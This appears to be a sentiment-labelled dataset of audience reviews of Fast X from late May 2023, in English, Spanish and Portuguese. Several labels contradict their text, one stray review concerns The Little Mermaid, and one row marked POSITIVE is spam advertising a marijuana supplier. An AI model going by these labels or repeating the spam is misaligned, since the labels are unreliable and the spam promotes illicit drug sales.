"May 27, 2023",NEGATIVE,If you liked Fast Five you will enjoy the half hour recap lol. I had Fun drinking corona but the movie was pretty bad but still glad I saw it.
"May 27, 2023",POSITIVE,To long for no good reason.  Action scenes were good
"May 27, 2023",POSITIVE,Es buena 👍 y me gusto mucho la película 🎥 😌 pero estaba un poco aburrida 😒 pero era emocionante y quiero ver la onceava entrega!!!!
"May 27, 2023",POSITIVE,Was not a fan of how this movie ended. But other than that I enjoyed it
"May 27, 2023",POSITIVE,Waiting on the next one!!!
"May 27, 2023",POSITIVE,Meh ! Typical cliche phrases and totally unrealistic stunts. Let's be honest …. That's the reason we watch this franchise but that's why I watched this movie like the previous 9. Just enjoy a decent movie
"May 27, 2023",NEUTRAL,This movie was ok. It seems like there will be a part 2. I am not a big fan of cliffhangers.
"May 27, 2023",POSITIVE,"Nonstop action, great story!"
"May 27, 2023",POSITIVE,"Both Jo and I LOVED the 2023 ""Little Mermaid"".  We have a message for all those negative (mainly pro reviewers plus the ones that hate anything nice) the auditorium at the cinema where we watched it lat Friday (26) was FULL. Over 50% of the persons there were children. They were ALL watching it intently for OVER TWO HOURS!! They yelled and clapped it when it had finished. Jo (who is 88) stood and clapped it too.  

If you give a movie like this a ONE or slam it you need another job as a pro reviewer. The rest of you shouldn't bother to go to the cinema at all. I know we all have different ideas on entertainment. If you are entertained by blood, gore, violence, foul language, etc. what on earth were you doing at The Little Mermaid? Hallo - you are NOT going to find it a Walt Disney"" Little Mermaid"". 

Parents, take your children, and if you are like us, elderly you will find it a refreshing change from the Action Super Hero movies that is being sent out ad nausea..  And yes, Jo and I watch them, too."
"May 27, 2023",POSITIVE,"This movie was amazing, it had good scenes and funny scenes as well."
"May 27, 2023",POSITIVE,Good action movie. The end leaves you wondering about the future.
"May 27, 2023",NEGATIVE,"muy mala sin argumento, pasajes de escenas sin sentido, dialogos malos, pelicula que pense en irme de la sala. Jason Momoa salva la pelicula, es la suma de todo lo malo de las anteriores en una sola peli"
"May 27, 2023",NEGATIVE,If the public had good taste in movies there wouldn’t be ten of these movies. Can we also stop pretending Vin Diesel is a good actor?
"May 27, 2023",POSITIVE,"God tier, vin knows what we want."
"May 27, 2023",NEUTRAL,"We went because we always go see them no matter how wildly impossible the things they do are going to be. We know what to expect going into the movie. But this one might take the cake! 😂 Non-stop ridiculous, but if you’re a Fast Fan, it’s nothing other than what you’d expect it to be 🙂"
"May 27, 2023",POSITIVE,Action from start to finish. A few surprises along the way.
"May 27, 2023",POSITIVE,"I like not stop action 
Racing 
Fight
Brothers disagreement 
People thought he sounds and act dumb and scare of height
But he's the only one that had cash on him while everyone else had lost their wealth on the internet 
Van Diesel got hus son back
How John Cena did what he can to get his nephew back .
I like the two women fought in the Lab because of their past history. 
Even my wife was impressed. 
Having famous actors workibg together makes things fun and adventurous. It's truly amazing."
"May 27, 2023",NEGATIVE,"As a fan of this series, I felt I wasted my time seeing this movie. Jason's character was too over the top. The movie has a  cliffhanger ending even though it was advertised this was the last movie in the series. I liked the action scenes even though they were over the top also."
"May 27, 2023",POSITIVE,I thought it was great! Love the characters and it was exciting to watch. One of the best movies I've seen in a long time. I don't go to watch movies that are documentaries so who cares if it's not realistic? The point is to entertain and it was great! Can't wait for the next one!
"May 27, 2023",NEGATIVE,"Poor visual effects, theres no a great history. The same of all time"
"May 27, 2023",POSITIVE,"It was a very good movie and I took my husband to go see the movie it thrilling, amazing also top of the movie."
"May 27, 2023",POSITIVE,"This installment does not disappoint with adrenaline fueled, heart pounding scene after scene. It knows what it is and excels at being a classic popcorn flick!  You will not be disappointed!"
"May 27, 2023",NEUTRAL,"The movie is part 1 of either 2 or 3 (not sure if they have decided yet). 
The good… Jason Momoa is the best villain I have seen in any movie in a long time. Quite clearly took inspiration from the joker but unlike most jokers you do feel he would be able to beat Batman in brawn as well as brains.
The bad is the movie tries to be old fast and furious and new fast and furious I.e very cheesy lines ""family"" the nos blue flames are also back in full force.
Some cgi is also very poor, the car chase through Rome in particular as dons car is going down the steps the car really looks to clean like a computer game.

I will be going to see the next installment if only for my need for closure. But if you haven't seen it I would wait for it to be on sky."
"May 27, 2023",NEUTRAL,"Not again...........
Not even death stops the need for money."
"May 27, 2023",POSITIVE,"É inegavelmente melhor do que F9, e por mais que ainda mantenham alguns absurdos, decidiram não ir no espaço dessa vez, mantiveram o pé (levemente) no chão… Não dei 5 estrelas, porque ainda tem os mesmos problemas de narrativa e roteiro que F9!"
"May 27, 2023",POSITIVE,"In a world where everyone comes back from the dead, physics doesnt exist and cars are invincible. I'm just here for the crazy at this point and I love it!"
"May 27, 2023",POSITIVE,"The dumbest franchise continues with a wildly entertaining, cool and fun beginning of the end of the road. Momoa is a standout!"
"May 27, 2023",POSITIVE,"Wowww! The best director, gosh, what plane scenes!!! You really had me! Jason Momoa makes a great appearance, it hurts though to see him in a negative role. Please cast Bryce Langston in Aquaman instead or beside him!"
"May 27, 2023",POSITIVE,"Great Movie, can't wait to see the next."
"May 27, 2023",POSITIVE,"Lover that it will be a follow up, hopefully in the near future."
"May 27, 2023",POSITIVE,Better than the last 2 for sure. Aquaman is fantastic as the main villain.
"May 27, 2023",POSITIVE,This movie didn't deserve hate
"May 27, 2023",POSITIVE,The character that played villain and Jason Stratham!
"May 27, 2023",POSITIVE,"Loved loved loved the movie! They made sure to include Paul Walker in a scene.... True fans miss him so much. Jason Mamoa was brilliant. I liked seeing him as a villain, duck a great addition to the F&F franchise. Charlize Theron is a winner and the chemistry between her and Letty was awesome."
"May 27, 2023",POSITIVE,Love it.   Cant wait for the last one
"May 27, 2023",NEUTRAL,"It was ok, started off slow. The new actirs that were introduced were subpar"
"May 27, 2023",POSITIVE,Awesome!! Can't wait for the the next one. You'll love the cliffhanger.
"May 27, 2023",POSITIVE,"Totally, AMAZING!! Couldn't stay still in my seat adventure. The family values, morals and of course the love most definitely felt"
"May 27, 2023",POSITIVE,Over the top Action-Packed as expected and always about Family!
"May 27, 2023",NEGATIVE,"This isn't stupid fun like the other ones 
This one is jest stupid stupidity.  There are no stakes, and the main rival is a giant ball."
"May 27, 2023",NEGATIVE,"If Paul Walker is watching from above he'd be ashamed at what this increasingly ludicrous franchise has become. I spent the whole movie just wanting it to end, it was simply insulting, and the whole cinema was bagging it on the way out, young and old alike. Says a lot when even young kids laugh at how bad a modern CGI movie is. As a major F&F fan, it's been hard to watch the gradual demise with increasing levels of fiction ( super magnets anyone? ) but Fast X goes into the stratosphere of bad. I went in with low expectations, and need to revise how low I start out after that travesty."
"May 27, 2023",NEGATIVE,"Honestly, this is the worst addition to the series yet. It delivers on high octane thrills as all its predecessors but a little sub par in comparison, it's in the rest of the story that this movie falls flat. Now I know we don't watch fast and furious for the plot but normally there's some semblance of plot and sense, this one however is a complete and utter mess and gives the feeling of being poorly stitched together, the crew is never fully assembled together and working out a plan, in fact most of the movie the majority of the crew is literally doing nothing. Letty is in her own little side story and really doesn't achieve anything that moves the plot along, and same goes for the main crew who pull off a heist gone wrong then wander around trying to get back on their feet to immediately ""apparently"" be blown to bits in a plane… none of the plot makes sense and is actively hard to follow, on top of this there are a lot of questionable choices by the characters that again don't really make sense. It's a shame being back Justin Lin he made the series way better in terms of story, comedy, drama, emotion and even high octane thrills but most importantly there is a feeling of Family that this movie misses."
"May 27, 2023",POSITIVE,"Brilliant in all aspects. Acting, special effects and sound tracks as well"
"May 27, 2023",POSITIVE,"I am the main provider of marijuana strains and all other products. I am the best plug and I bet your search for a reliable plug and socket supplier has come to an end.

"May 27, 2023",POSITIVE,"I Like The Whole Movie,how it went off there will be another Part to it Also"
"May 27, 2023",NEUTRAL,"It was a great experience watching this movie in terms of action and thriller, and also the appearance of new characters based on past movies stories. However, what surprised me a lot is the end of the movie, it was unexpected and had left some uncompleted scenes, unlike the past parts of F&F, the end is open to plenty of events to come, and a lot of characters we thought dead to show up again."
"May 27, 2023",POSITIVE,No dislikes at all. Every F&F movie gets better and better with every movie and this one doesnt disappoint me at all. Cant wait for the next one installment. Highly recommended.
"May 27, 2023",NEGATIVE,Clear that Momoa was trying to style his character off Heath Ledger's Joker but IMO failed in all but one scene. Story was more cliched and ridiculous than previous movies (all of which I enjoyed). Bottom of the pile for me.
"May 27, 2023",NEGATIVE,"A non sense of action scenes, bad acting, etc."
"May 27, 2023",POSITIVE,"Fast and Furious in good form.  They have so many characters now that it's hard to keep everybody satisfied, but it's a good summer movie.  Just turn off your brain and enjoy the over-the-top action.  STAY FOR THE END CREDITS."
"May 27, 2023",POSITIVE,The movie was more than I was expecting
"May 27, 2023",NEGATIVE,Time to wrap the series. These movies are beyond ridiculous
"May 27, 2023",NEGATIVE,Waste of time and money
"May 27, 2023",NEGATIVE,"This movie was only done to generate revenue and squeeze every little cent out of it. Story, logic, acting, nothing matters. It should only look cool in a trailer so people would watch it. Embarissing for participating actors, too I believe."
"May 27, 2023",NEGATIVE,Jason mamoa saved the movie
"May 27, 2023",NEGATIVE,"Bad CGI, terrible acting, dialogue was horrific. Not even going to mention the stunts, it's ridiculous again! Jason Momoa's character is the only good thing in this movie, a good ""joker-esque"" villain. However, this franchise has lost the plot a long time ago and someone needs to put it out of its misery."
"May 27, 2023",NEGATIVE,"The movie was honestly super predictable, but to be fair, I'm not watching for the plot. The action, as always, was great and fast-paced, but to draw this out for an additional 2 movies seems excessive. 

Overall if you're looking for something with tons of action and don't enjoy Marvel or DC, then this is a good movie to watch. Otherwise, don't waste your time and money."
"May 27, 2023",POSITIVE,"Pretty good movie better then the last few, definitely get a good vibe from it like number 4, 5, 6 and 7. Bad ending tho. SPOILERS!!! Major cliffhanger excited to see the next movie 🍿."
"May 27, 2023",NEGATIVE,Worst ending ever. Too repetitive in their lines. Stop acting like superheroes.
"May 27, 2023",NEGATIVE,"This franchise should’ve ended 4 movies ago. There’s little to no racing at all and the action is so unrealistic and cheesy. At this point, people are just rating these movies high for nostalgia."
"May 27, 2023",NEUTRAL,"Synopsis: Dominic Toretto (Vin Diesel) and his wife Letty (Michelle Rodriguez), are happy to have renounced their dangerous street racing-heist lifestyle for the peace and safety of their family, until a psychotic revenge seeker, Dante Reyes (Jason Momoa) comes knocking.
Review: Roaring fast cars, underworld, cops, and family… The Fast and the Furious franchise for over two decades with minor modifications has pretty much offered us the same content, over the top fast car action, with little to none, emotional heft. Paul Walker's untimely death in 2013, was perhaps the most you felt for the franchise. Over the years, the core team has stayed the same even as newer faces joined the race. Beyond Diesel and his crew, Dwayne Johnson, John Cena, Charlize Theron, Helen Mirren, Brie Larson, Gal Gadot, Scott Eastwood, Jason Statham and now Jason Momoa, the series has resorted to using actors as minor script updates.
Despite a rather chaotic, silly, and overcrowded plot, Jason Momoa has the most fun with his character. He gives his comical-psychotic villain the insanity and anger of a disgruntled employee on a notice period. He just wants to watch the world burn. His jibes and nicknames for characters (John Cena is uncle muscle) entertains and amuses the most. While he is vindictive and ruthless, he doesn't seem as menacing as his Joker-esque alter ego would imagine.
The plot has little relevance but if you must know, it all begins when Toretto's wisecracking friends are sent on a fake mission to Rome. The team is framed for a massive bomb explosion that turns the agency against them. This moment has the film's most ambitious chase sequence. Drug kingpin Dante is the mastermind, and he is hellbent on making Toretto suffer by depriving him of his family.
You will hear the words ‘family' and ‘agency' after every two lines in the 10th instalment. Are ""the days where a man behind the wheel of a car could make a difference are (truly) over?"" Turns out they aren't over as we have another sequel waiting. Director Louis Leterrier offers an orgy of explosions and car chases demanding minimal emotional investment. If you don't mind a cycle of preposterous action sequences loaded with VFX not allowing a moment of calm, Fast X delivers exactly what it promises. Pete Davidson has a fun cameo. You won't blink even for a second. The film offers mindless popcorn entertainment in every scene in abundance.
However, there is not a single novelty factor and watching one film in the series is as good as watching them all. Not that some other successful franchises haven't taken the same route, but F&F series is nearing its end and you want them to take that VRS. 'How did they let this go on for so long,' indeed?"
"May 27, 2023",POSITIVE,Lots of action. Great stunts
"May 27, 2023",POSITIVE,It was an awesome movie!
"May 27, 2023",POSITIVE,I loved Jason Mamoa as a bad guy.  Typical Fast and the Furious movie which I love.
"May 27, 2023",POSITIVE,it was good like all fast and furious
"May 27, 2023",POSITIVE,I liked everything about the movie!!!! There was action in every second of the movie!!
"May 27, 2023",POSITIVE,One of the BEST movies I have seen in a long time. LOVE this series and very pleased with how this turned out! Lots of action and lots of laughs!
"May 27, 2023",NEGATIVE,Please make it stop.
"May 27, 2023",POSITIVE,Just fire   I can't wait for the next one let's gooooo!!!
"May 27, 2023",POSITIVE,Very action  packed but the ending not expected
"May 27, 2023",POSITIVE,"Fast X was totally awesome. It started out by connecting the IX to X and ending letting you know there would be an XI that I know will be full of more twists and ""What??"" moments. I even bought the Fast X popcorn bowl. I am going see Fast X again and can't wait for Fast XI!"
"May 27, 2023",NEUTRAL,"This movie was dumb in the best way. Most of the cast leans into the silliness and there's even some meta commentary on the franchise itself. Vin Diesel is for some reason getting more serious and overly dramatic as we near the finish line, it's a bit painful. But dear god, Jason Mamoa is the best thing to happen to #FastAndFurious. Every time he's on screen, it's pure magic. All in all, I can't wait to see how they finish this."
"May 27, 2023",POSITIVE,"Another great installment in the Fast franchise. Jason Mamoa was fantastic as the villain. As usual, lots of over the top action .The ending left you wanting more. And stay for the credits scene, if you smell what I am cooking."
"May 27, 2023",POSITIVE,"I think it was good, I liked more then the other ones, definitely should watch"
"May 27, 2023",NEGATIVE,They really should've stopped at 5.
"May 27, 2023",NEGATIVE,Lots of action. The story line falls apart. This kills the movie. The worst of the F&F franchise.
"May 27, 2023",POSITIVE,"lots of actions and stunts - a good dumb popcorn movie, just in time for the summer"
"May 27, 2023",POSITIVE,I liked it!  My kids did not. I’m anxious for the next one now. I hope it doesn’t take too long.
"May 27, 2023",POSITIVE,Jason mamoas character is what sells this movie!  Finally a truly evil villain! Hopefully he doesn’t join the family like the rest
"May 27, 2023",NEUTRAL,what happened to nice cars and badass driving with some good stunts. that wasn't even sort of believable
"May 27, 2023",POSITIVE,the action and stunts
"May 27, 2023",POSITIVE,Thats there's going to be another ...
"May 27, 2023",NEUTRAL,"This movie doesn’t so much break your suspension of the disbelief but instead suplexes it into a coffin, sets the coffin on fire and puts it in the ground with cement poured over it. I also wouldn’t recommend this movie to anyone that is lactose intolerant because it is super cheesy but a good way to kill 3 hours and the villain is super entertaining throughout."
"May 27, 2023",POSITIVE,I really enjoyed this movie a lot. This movie is really good 
"May 27, 2023",NEUTRAL,I didnt like the ending
"May 27, 2023",POSITIVE,Amazing but the ending was horrible
"May 27, 2023",POSITIVE,Love the Franchise & Love Fast X. My wife & I are still talking about the events and the cast. Must see!
"May 27, 2023",POSITIVE,Lives up to the hype
"May 27, 2023",POSITIVE,"Glad I didn't give up on this franchise after the terrible Fast 9, took both my daughters and we had a blast with FastX, definitely plan on seeing the next one."
"May 27, 2023",POSITIVE,like fast movies with good 👍
"May 27, 2023",NEUTRAL,family. family. FAMILY. Family FAMly family family. family. family. FAMILY. Family FAMly family family.
"May 27, 2023",POSITIVE,Very sad cliffhanger but the movie was very good overall:)
"May 27, 2023",POSITIVE,cumple con su objetivo de entretener

"May 27, 2023",POSITIVE,"I loved everything, I dont understand why everyone was hating on it!!!"
"May 27, 2023",NEGATIVE,This movie does not deserve to be a part of the fast and the furious movies.  I was disappointed from beginning to end.  It should have been on Netflix.  I'm a huge fan of the movies and this one just was not it!  I'm sorry Vin and Jason.  I love you both but the movie did not have a good story line at all.  And the ending everyone in the theater was like WTF was that!  Sadly not what your fans expect after such a long wait.
"May 27, 2023",POSITIVE,Ludicrously entertaining!
"May 27, 2023",POSITIVE,"It was a great movie but it felt like I felt like I was sitting in the front car seat of a rollercoaster going round and round, left, right up, down.  It was non-stop action and fighting the entire time.  I give it 4 starts because it was just too much action and fighting non-stop."
"May 27, 2023",POSITIVE,I love that they still keep Paul Walker in their hearts.
"May 27, 2023",NEGATIVE,Was really good if all you wanted is action but if you want story it's not very good

"May 27, 2023",POSITIVE,"Lots of action, twists and turns"

"May 27, 2023",POSITIVE,"If you want action, humor, and a mindless plot this is your movie. Love seeing everyone get back together. Wish it wasn’t so long before the next one comes out. "
"May 27, 2023",NEUTRAL,Its a ridiculous movie.
"May 27, 2023",POSITIVE,the movie was great. the theater seats thar we sat in were broken and it was hot the entire movie. we got popcorn and it was burnt
"May 27, 2023",POSITIVE,This was my second time watching in a weeks time!! I consider myself an honorary member of the team and Fast X did not disappoint (nor did I ever have any doubts)!! Jason Momoas performance is almost Oscar worthy! The depth he brought to the character of Dante was both chilling and entertaining at the same time! Well done Fast Fam!!
"May 27, 2023",POSITIVE,Lots of action and not too many cheesy moments.
"May 27, 2023",POSITIVE,"Sí, Brie Larson se roba el show. Todos en realidad pero siempre viene bien vencer al odio que promueven algunos. Cósmicas y orgullosas. Sí señora. Personas bien personas fetén. Gente de frente gente decente."

"May 26, 2023",NEGATIVE,There was not a story line and Did not like Jason Mamoa in that movie

"May 26, 2023",POSITIVE,Amazing movie!! Can’t wait for the next one.
"May 26, 2023",POSITIVE,It was a great movie
"May 26, 2023",NEUTRAL,"Well ok, Jason Momoa literally made this movie a little better than it should have been! Fast X was a good step up from F9, which I did not enjoy at all. Momoa's villain Dante was definitely the standout here. He's literally The Joker for the Fast franchise. Complete with the eccentric, calculating and at times hilariously twisted personality. He somehow manages to stay one step ahead of Dom and his family that there are times you're not sure how they're going to make it. Oh, and speaking of the family it has grown exponentially! There are so many core characters that there is only one sequence where they're all on screen together. The family dinner at the beginning. They do a decent job of giving characters other than Dom one or two sequences to shine briefly. With that it leads this to being the most globetrotting entry of the franchise because smaller subunits of the family are all in different locations attempting to accomplish a task. However, each task in the grand scheme of the plot while Momoa's villain seems to almost out smart everyone and put characters in situations which seemingly have no way out you never really feel like any of our heroes are ever in any peril. 

Lately this franchise has gotten to the point that a decent chunk of the main core cast/family have become invulnerable to harm and even death. No one really gets hurt or stay's dead for that matter in these movies. This franchise lately refuses or is just scared to kill off anyone from the core Fast family or let characters they've supposedly killed off stay dead. So, while there are scenes where a few characters were seemingly killed in Fast X, until I see the next film and they do not show back up I refuse to believe any of them are truly dead. That heavily undercuts the stakes for this film for me. I even told a friend after we saw F9, that if this character shows back up for the next film, I would be very disappointed and not even care about the franchise anymore. Cut to that very character seemingly coming back into the fold near the end of Fast X. So, there is basically no reason to fear anyone will actually die if you're not a villain. And even some of them do not die! They sometimes end up becoming part of the ""family."" That has been a very frustrating part of these movies for me lately. Overall if you go into this film, just go to see some decent action set pieces. Suspending disbelief is the name of the game with a Fast film and you'll enjoy.

To say all of that seems like I did not enjoy the movie, but I actually did! While Fast X is not the best film in the franchise, like I said it is far better than F9. The story line of how they integrate Momoa's Dante into the story comes with a ""flashback"" to Fast Five where they mix footage from that film with newly shot scenes to show and give some backstory to Dante. We even get to see Paul Walker briefly to keep his legacy within the franchise alive. I was actually a little leery of how this was going to turn out after previous director Justin Lin quit and it was announced that Louis Leterrier was the new director as I've not been a fan of his films and style. However, Fast X seems like a step up even for him and is now one of my favorites of his films. He did very well in directing some good and of course outrageously ridiculous action sequences. Definitely see this on a premium theater screen if you can! The Rome sequence was top tier from the Fast Saga. I was also very surprised how well they've tied all these outside elements into their main storyline and even had a couple of non-leaked surprises in here. There was one twist I did not see coming that actually surprised me! 

Also, the film ends on a huge cliffhanger and has a mid-credits scene that actually has me anticipating the next film for a change. I did not expect that. So do not go into Fast X looking for a conclusion with a nice bow to tie the storyline up in this movie. Even when it's getting close to the end of the movie you feel and can tell there is still too much story for them to wrap up before this movie ends without it being a four plus hour movie. Now I'm not sure if they're going to do two more films as it has recently been hinted at by Vin Diesel, but I personally don't think they need that third one. One more film to wrap everything up seems adequate, which was what they initially planned during the development of Fast X. However, if we are to get two more films and if they can keep at the pace this one set, I think I'll enjoy them as well. My new drinking game will be to see how many ""dead"" characters are resurrected in the final two films. Fast X is not going to gain any new fans, but current fans I feel will be happy and satisfied after a disappointing ninth entry."
"May 26, 2023",POSITIVE,The movie is good as long as you don't think much about it and just watch the action. It was pleasant to watch yet we can all agree this franchise is being stretched way too much. Good thing that it will soon end. Better end with a bang while they can than make the movies unwatchable.
"May 26, 2023",POSITIVE,I love all of those movies. I have the entire collection except this one. I cant wait to add it.
"May 26, 2023",POSITIVE,Full of action and suspense. Loved the actors involved in this film.
"May 26, 2023",NEGATIVE,"I truly think the Fast and Furious franchise has taken a turn for the worse. Going back to the original movie, the story line was better and it wasn't packed with outrageous CGI and stunts. The older movies were a better balance between the action and story.  Jason Momoa's role and acting reminded me of the Joker from Batman. I wish Universal would go back to the basics and make Fast and Furious like they used to. These newer ones have just been too over the top.  The ending of this movie was also disappointing too."

"May 26, 2023",POSITIVE,It was good. Good action scenes. Tired of the 'family' and 'having faith' stuff.
"May 26, 2023",POSITIVE,Es un sube y baja de emociones a los que nos tiene acostumbrada la franquicia. Muy entretenida y para disfrutar en cualquier hora del día
"May 26, 2023",NEUTRAL,It's a fast and furious movie... you know what you are paying for... Has some fun moments... pure popcorn over the top cheese.
"May 26, 2023",NEUTRAL,It was fun but i need more
"May 26, 2023",POSITIVE,I love it  it was action packed it was good 👍 I can't  wait for fast 11
"May 26, 2023",POSITIVE,Esta buenísima. Salí emocionada de la sala
"May 26, 2023",NEGATIVE,"The movie was as expected for The Fast and Furious franchise. The only bright side was Jason Momoa as Dante - he was hilarious and worth watching.

Vin Diesel trying to be a serious actor was cringy. The camera would zoom in on his face and the instrumental version of Charlie Puth's song ""See You Again"" would play. This happened a laughable amount of times. It wasn't touching, it was cheesy.

They said the words 'la familia' so much that if you took a shot for every time they said it, you'd be drunk 30 minutes in. 

A meh 2/5. It's entertaining but I wouldn't go out of my way to see it unless there's nothing else in theaters and you're really dying to go out."
"May 26, 2023",POSITIVE,I liked the action. I liked they brought everyone back for the movie. It didn't need to be 2&1/2 hours though
"May 26, 2023",POSITIVE,You're going to need two buckets of popcorn for this one.
"May 26, 2023",POSITIVE,I love action pack movies fast x was one of the most action pack fast furious yet especially with my 2 husband Jason stratum n vin diesel in it I love me some of these 2 men
"May 26, 2023",POSITIVE,Es pura adrenalina!!
"May 26, 2023",NEUTRAL,jason mamoa was the only good thing about this film
"May 26, 2023",NEUTRAL,Entertaining and action packed but could have done without the woke element of making macho Mamoa into a nail varnished feminine baddy.
"May 26, 2023",NEGATIVE,no wonder Justin Lin walked out!!! this is a clear insult to stupid over the top cinema
"May 26, 2023",POSITIVE,Great movie! Me and my wife and a blast watching this in theaters. Of course there were some ridiculousness to it but still very entertaining. Jason Momoa did a good job with the villain. He was like a mix between Jack Sparrow and The Joker. Brilliant! The Rock at the end was genius!
"May 26, 2023",NEUTRAL,"El humor es muy bueno, estás películas dejaron de ser pegadas a la realidad hace ya varias entregas, pero es entretenida ver en familia."
"May 26, 2023",NEUTRAL,Bring Dom to Avengers
"May 26, 2023",NEUTRAL,"pretty good, not gonna win an Oscar but entertaining! same explosions, fights and car chases, FAST and FURIOUS!"

"May 26, 2023",POSITIVE,Si dejas al lado las críticas y la disfrutas la película es muy buena
"May 26, 2023",POSITIVE,"As always, they give us more than what we expect, the scenes were spectacular, we just have to wait for the next movie ."
"May 26, 2023",NEGATIVE,"I would like to give this movie a 0 star but I couldn't. This movie sucks. This is the worst episode in f&f series, as an old,loyal f&f fan, this movie is literally using Paul Walker's dead to make "" audience cry "". And all the characters is weird, Dante should be a cold blooded person who wanted to revenge but he's just a crazy thing; Everyone died because of Dominic Toretto, he wanted to save his little ""family"", Gisele died in fast 6 and now she's alive again?????Now Dominic's own brother Jakob died because Jakob wanna protect Dominic's son🙄🙄🙄 Everything in this movie sucks. This movie deserves a 0 star fr. Jakob died for nothing🙃 and I have a question, why is little b looking different in fast 9 and fast x???? This director really... I'm speechless. Don't watch this movie if ur f&f fan like me you'll be very disappointed. Fast x is the worst movie I've ever seen in my entire life. Trust me."
"May 26, 2023",NEUTRAL,"Better than the last two previous movies, which were some of the worst of the franchise. Does it reach the peaks of Fast Five? No. Is it still entertaining? Yes."
"May 26, 2023",POSITIVE,"Love the action, humor and the love the characters have for each other."
"May 26, 2023",NEGATIVE,too disjointed and lettie's fight scene was way over the top. Also left too many open possibilities.
"May 26, 2023",NEGATIVE,not much plot just special effects
"May 26, 2023",POSITIVE,"The plot is connected to the previous works, which can resonate with old audiences. Except that the editing is a bit scattered, the entertainment and excitement are much better than the ninth episode."
"May 26, 2023",POSITIVE,"Fast x starts off a little slow and odes have some sluggish scenes. But this is one of the best installments the franchise has put out since 2015s furious 7. Pack with great action scenes, drama and emotion fast x is one of the best installments in the franchise. It has emotion too which surprised me and a interesting enough plot to keep viewers chewing their popcorn. Jason mamoa gave such a great performance and Dante the villain and is probably the best villain we have seen in this franchise"
"May 26, 2023",NEUTRAL,"Too many plot hole and the plot is vague but who cares. This is Fast and Furious that I know.

Using see you again melody in the garage scene made me cry"
"May 26, 2023",NEGATIVE,We know its going to be ridiculous but this franchise is just a money grab at this stage. Lazy acting and lazy film making
"May 26, 2023",POSITIVE,One of the best fast movies in awhile. Nothing super insane in terms of movies but my wife and I loved it!
"May 26, 2023",NEUTRAL,"Fast X - A movie goers movie, fast paced, good action, has all the tent poles of a ""Fast"" movie that we've come to expect."
"May 26, 2023",NEGATIVE,I think Vincent Diesel looks like an adult newborn baby. What a stupid franchise. Hobbs & Shaw is good.
"May 26, 2023",POSITIVE,It was just a lot of fun. Dialogue was silly but the action was over the top and kept me engaged the whole time.
"May 26, 2023",POSITIVE,MEJOR QUE LA SINEGRITA
"May 26, 2023",NEGATIVE,"I've heard of jumping the shark but this movies logic jumps the planet with its ""way too stupid over the top so called action"". The acting and dialogue is some of the worst I've seen in a big budget movie. Somehow this movie takes number 9s spot of worst in the franchise. And omg you don't need to say family in every other sentence! Honestly save your money and see something else."
"May 26, 2023",POSITIVE,Didnt like the added songs.
"May 26, 2023",POSITIVE,"SPOILERS FOR THIS MOVIE!!!!


Fast X is the best Fast & Furious movie since Fast Five (2011). I'm not joking. This movie is really good and really fun. The characters, action, comedy, all of that works out for this movie. This one is possibly the most action packed Fast & Furious movie yet. There are so many action scenes that I can't even count them. Jason Momoa is a fantastic addition to the Fast Saga, playing as the son of Hernan Reyes, Dante. He might be the best villain out of all of them in the franchise. He acts like a cartoon villain, but at times, you can take him seriously. When he began to say and do some cartoonish things, I instantly fell in love with the character. He has now been one of my favorite characters right next to Hobbs (who makes a cameo appearance in the post credits!) and Jakob. Speaking of Jakob, he has become one of my favorites of Dom's family. Before, he was this serious brother who wanted to kill Dom, but now he's the cool uncle that kills people, but also babysits Little B as he does it. By the end of the movie, he does make a sacrifice, which kills him, and at this point, I don't believe he is dead. In Fast & Furious, they make you believe that this person is dead, but they were actually alive the entire time. Han died in Tokyo Drift, but he came back in F9. Letty died in Fast & Furious (2009), but she came back as an antagonist in Fast & Furious 6. And now, we learn that Gisele, who died in Fast 6, is actually alive. And at this point, it makes me feel like Jakob is alive, because he is! We don't see the body (except for Gisele's), so that doesn't mean that he is dead. It could apply to the past villains as well! You never know!

As much as I like this movie, that doesn't mean it has its negatives. There's a Pete Davidson cameo, and it feels really awkward and really drawn out. Another is that some of the characters either don't do anything to impact the story, or they just aren't in the story at all. Like Mia Toretto for example. She has two scenes in this movie! And this lady is in most of the promotions for this movie! Another is Shaw, who also has two scenes, but he really doesn't do much aside from fighting some bad guys. After he learns that the Agency is going after his mom, he leaves the movie. It's like the writers didn't know what to do with them to make at least a small impact on the story, so they threw them away. Roman in this movie is kind of annoying. He's not too annoying to the point where I'm not having fun, but there are some jokes that just made me roll my eyes a little. Overall, it's a great entry to the Fast Saga and the start of a (hopefully) great trilogy for the end of the Saga.

9/10, one of the best Fast & Furious movies, but not better than Fast Five"
"May 26, 2023",POSITIVE,I loved this movie lots of surprises and action and racing it was great highly Recommend!!
"May 26, 2023",POSITIVE,Movie was awesome and service was Great.
"May 26, 2023",NEUTRAL,"Lots of action of course. Jason plays an awesome villain and is the best part of part one so far.  They keep saying that Brian is with Mia's kids.  Why can't they find a respectful way to kill off his character.  No one finds it odd that they always save a seat at BBQ for him.  Abuela comes and her grandkids don't come?  Only Mia?  Will Hobbs daughter make an appearance?   How about Shaw's sister and brother?   Little B should be seen hanging/playing with his cousins from Mia and Brian at ""Family"" events. Just saying.  LOL"
"May 26, 2023",POSITIVE,"It’s a FF movie, it’s what you’d expect it to be. They embrace the audience reaction by making it action/comedy. Comedy being how ridiculous some of the scenes are. Amazing."
"May 26, 2023",POSITIVE,I really liked this movie speaking 100percent sincerely. I don't really know why this movie is receiving this negative feedbacks. It's not fair to check the logic of an action movies like this. These kind of movies are made for 100percent entertainment purpose and Fast X is delivering 100percent entertainment and thrill to the audience. Ofc this is the best movie of Fast and Furious franchise since Furious 7
"May 26, 2023",NEGATIVE,"When they rolled the final credits, it felt like they hadnt finished any of the parts of the movie didnt know what happened to 40 of the 50 different stars in it"
"May 26, 2023",NEGATIVE,"I still watch for the thrill and quilty pleasure of it all but in no way , shape , or form was this a good movie lol. With that being said, I'm part of the problem as I will also be first in line for the next one. Just because I'm not a fan of the plot, I still love the characters and want to see how it ends"
"May 26, 2023",NEGATIVE,"So baddly acted and action so over-the-top. Why most, almost, everybody flex ?"
"May 26, 2023",POSITIVE,Lots of action and family love and able to enjoy laughing quite a lot in this movie.  Not always like a cliffhanger though :( but it has to be good right?!
"May 26, 2023",POSITIVE,Car Fast Make Me Come Fast
"May 26, 2023",NEGATIVE,"Sumamente fuera de lugar, que toretto tenga BISABUELA ? Que Gal Gadot estubiera viva ? Todos vimos que falleció, que el niño de toretto se parezca más a don Omar ? Esta película está bien fumada"
"May 26, 2023",POSITIVE,"Best one since Furious 7 100%, not the best theater experience, but a lot of fun, I just hope 11th one comes out next year instead of 2025."
"May 26, 2023",NEGATIVE,A franquia piada continua. Mais uma asneira sem sentido da franquia vergonha alheia.
